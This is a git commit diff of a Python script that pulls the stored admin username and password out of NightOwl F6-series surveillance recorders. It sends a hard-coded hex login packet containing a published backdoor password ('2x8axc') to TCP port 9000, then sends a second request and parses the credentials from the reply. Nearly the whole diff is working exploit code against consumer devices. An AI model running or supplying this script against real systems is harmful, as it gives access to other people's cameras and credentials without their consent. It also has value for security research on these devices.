99701dfc72712f1d85e180a3bc3626c449a6d757
btaub <beau.taub@gmail.com>
2024-04-14 02:15:13 -0400

    clean up script and README

--- NightOwl_F6-get-admin-password.py
+++ NightOwl_F6-get-admin-password.py
@@ -4,14 +4,16 @@ import argparse
 import binascii
 import socket
 import sys
+import re
 
+# Arguments
 parser = argparse.ArgumentParser(
                     description = 'This script recovers the admin '
                                   'password for NightOwl F6-series devices (and maybe others) '
                                   'using the published master password',
-                    epilog = 'Master pass for this model is 2x8axc\n'
+                    epilog = 'Backdoor pass for this model is 2x8axc\n'
                              'from https://support.nightowlsp.com/hc/en-us/articles/'
-                             '360009216554-Night-Owl-Legacy-Devices. Check that link for other master '
+                             '360009216554-Night-Owl-Legacy-Devices. Check that link for other backdoor '
                              'passwords for older systems')
 parser.add_argument('-t','--target', required=True ,help='NightOwl device IP')
 parser.add_argument('-p','--port',type=int,default=9000,help='Default port 9000 should work')
@@ -20,21 +22,20 @@ parser.add_argument('-v','--verbose',
 
 args = parser.parse_args()
 
-print("\nTarget:  %s\nPort:    %s\nVerbose: %s"
-        % (args.target, args.port, args.verbose))
-
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(2)
 
+# Setup the connection
 try:
     s.connect((args.target, args.port))
-except socket.timeout as e:
+except Exception as e:
     print("\nERROR: %s connecting to %s\nCheck the IP and try again" % (e, args.target ))
     sys.exit(-1)
 
-# 61646d696e   = admin
+# 61646d696e   = admin (can be anything)
 # 327838617863 = 2x8axc
-str_init =   ('000000001f000000500000008406000061646d696e00000000000000000000000000000000000' +
+#str_init =   ('000000001f000000500000008406000061646d696e00000000000000000000000000000000000' +
+str_init =   ('000000001f0000005000000084060000010101010100000000000000000000000000000000000' +
               '00000000000000000000000000032783861786300000000000000000000000000000000000000' +
               '00000000000000000000000000000001000000')
 str_getPass = '00000000d300f9010000000090060000'
@@ -42,22 +43,42 @@ str_getPass = '00000000d300f9010000000090060000'
 s.send(binascii.unhexlify(str_init))
 resp = s.recv(1024)
 
-if resp:
-    print('\nSeems like it took the master pass, let\'s proceed.\n')
-else:
+# Empty response = it didn't accept the backdoor password
+if not resp:
     print('\nSomething went wrong, exiting script...\n')
     sys.exit(-1)
 
-if args.verbose:
-    print('INITIAL RESPONSE: %s\n' % resp)
+# List objects for the data
+systemData = []
+userData = []
 
+# If -v is called, print out system data
+if args.verbose:
+    #print('INITIAL RESPONSE: %s\n' % resp) # Ugly version of verbose system data
+    #print('INITIAL RESPONSE: %s\n' % resp.split(b'\x00'))
+    for x in resp.split(b'\x00'):
+        x = x.decode(errors="ignore")
+        # Only use the printable chars
+        resp = re.search(r'^[\x21-\x7F]+$', x)
+
+        if resp:
+            if len(resp.group(0)) > 1:
+                systemData.append(resp.group(0))
+    print(f"\n[VERBOSE] SYSTEM DATA: {sorted(set(systemData))}")
+
+# Get the user data
 s.send(binascii.unhexlify(str_getPass))
 resp = s.recv(1024)
 
-if args.verbose:
-    print('FINAL RESPONSE: %s\n' % resp)
+for x in resp.decode(errors='ignore').split('\x00'):
+    resp = re.search(r'^[\x21-\x7F]+$', x)
+    if resp:
+        userData.append(resp.group(0))
 
-print('Stored creds:\n')
-print('USERNAME: %s' % str(resp[56:61]).split("'")[1])
-print('PASSWORD: %s' % str(resp[40:48]).split("'")[1])
-print('\n')
+if args.verbose:
+    print(f"[VERBOSE] USER DATA:   {userData}")
+
+# Admin pass/user is always 0 and 1 slices respectively
+print(f"\n[INFO] ADMIN USER: {userData[1]}")
+print(f"[INFO] ADMIN PASS: {userData[0]}\n")
+
